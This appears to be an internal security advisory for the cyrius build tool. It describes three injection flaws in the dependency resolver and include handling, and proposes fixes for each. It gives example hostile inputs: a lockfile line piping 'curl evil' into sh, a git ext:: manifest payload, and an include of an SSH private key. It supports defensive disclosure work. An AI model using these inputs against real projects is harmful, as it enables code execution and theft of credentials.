# Dep-resolver / include injection class — CVE-14/15/16

**Discovered:** 2026-06-10 during the deep-dive review ([`docs/audit/2026-06-10-deep-dive-review.md`](../../audit/2026-06-10-deep-dive-review.md))
**Severity:** Critical (CVE-14 is P0-class)
**Affects:** cycc / cyrius 6.1.31 (CVE-15/16 long-standing; CVE-14 since the `_sha256sum_file` Linux branch)

## Summary

Three injection sinks in the dep resolver and include path handling. CVE-14
and CVE-15 are the *same root* the original CVE-01 closed (shell string built
from manifest/lockfile data), in sibling sinks the CVE-01 fix didn't touch.
CVE-16 is the *unshipped half* of CVE-02. The audit's preferred fix for all
three — `execve` with argv arrays, no shell, plus an absolute-path reject — was
recommended for CVE-01/02 and is the right shape here.

## CVE-14 — `deps --verify`/`--lock` lockfile path → `/bin/sh -c` (P0/P1)

`_sha256sum_file`'s Linux branch concatenates `path` into `"sha256sum "+path`
and execs it via `/bin/sh -c` with **no metacharacter validation**
(`cbt/deps.cyr:1313-1329`). `cmd_deps_verify` reads `path` verbatim from
`cyrius.lock` (`:1474-1482`) and hands it straight to `_sha256sum_file`
(`:1484`). A hostile lock line — `<64hex>  /x; curl evil|sh` — or a resolved
dep whose `.cyr` filename contains shell metacharacters runs arbitrary
commands.

Exposure is **broad**: `cmd_deps_lock` auto-runs on every `cyrius deps`/`build`
(`deps.cyr:1032-1037`, `_auto_deps:1043`) and hashes `dir_list` filenames
(`:1420,1427`) — so this fires on a normal build against a dep with a crafted
filename, not just on explicit `--verify`. That breadth is why it's arguably
P0, not P1.

The git-clone path **does** sanitize `;|\`$&()` (`:692,703` — the CVE-01 fix);
the Windows branch is already safe (`certutil` via `exec_capture` argv,
`:1288-1294`). This sink was simply missed.

**Fix:** replace the `/bin/sh` string-concat with a direct `sys_execve` of
`sha256sum` passing `path` as a distinct argv element (mirror the Windows
`exec_capture` style; `sys_execve` is already used in `lib/callback`/`pam`/
`regression`). Reject paths containing shell metacharacters as a belt-and-suspenders.

## CVE-15 — git/tag arg-injection (CVE-01 residual) (P1)

Dep resolution still builds a shell string `git clone --depth 1 -q <git> <dir>`
and runs `sys_system(cmd)` (`deps.cyr:716-732`). The CVE-01 denylist (`:694`)
rejects only `;|\`$&()` — **not space (32), leading `-`, `<`/`>`, newline, or
glob**. The git value is captured verbatim between quotes (`:617-624`), so
embedded spaces survive. A manifest like:

```toml
[deps.x]
git = "-c protocol.ext.allow=always --upload-pack=… ext::sh -c <payload> …"
```

contains no blocked byte → becomes positional `git clone` args → local RCE.
The tag denylist (`:703`) is weaker still (omits `()`).

**Fix:** replace `sys_system` with a direct `execve` of `git`, each manifest
field a distinct argv element (no shell, no concat); and/or reject any git/tag
value beginning with `-` and reject whitespace. Denylisting a shell string is
the wrong shape — argv is.

## CVE-16 — absolute-path includes (CVE-02 residual) (P2)

`READFILE`'s CVE-02 guard (`lex.cyr:622-637`) walks the path rejecting only
`..` components. There is no leading-`/` rejection anywhere in `lex.cyr`. A
hostile `.cyr` can `include "/home/user/.ssh/id_rsa"`; contents are lexed and
can surface via error text or be embedded into output. The original CVE-02 fix
spec (archived audit, line 39) said *"reject paths containing `..` **or
absolute paths starting with `/`**"* — only the `..` half landed.

**Fix:** reject paths beginning with `/` (and Windows drive-absolute) unless
`CYRIUS_ALLOW_ABSOLUTE_INCLUDES=1`, matching the existing
`CYRIUS_ALLOW_PARENT_INCLUDES` override pattern.

## Proposed fix (all three)

Convert the two `sys_system`/`sh -c` sinks (`_sha256sum_file` Linux,
`git clone`) to argv `execve`, and add the absolute-path reject. One release;
verify the dep funcgate still resolves the ecosystem deps byte-identical.

## Status

Filed 2026-06-10. Recommended for the first packed hardening release alongside
[live-silent-failure-regressions](2026-06-10-live-silent-failure-regressions.md).
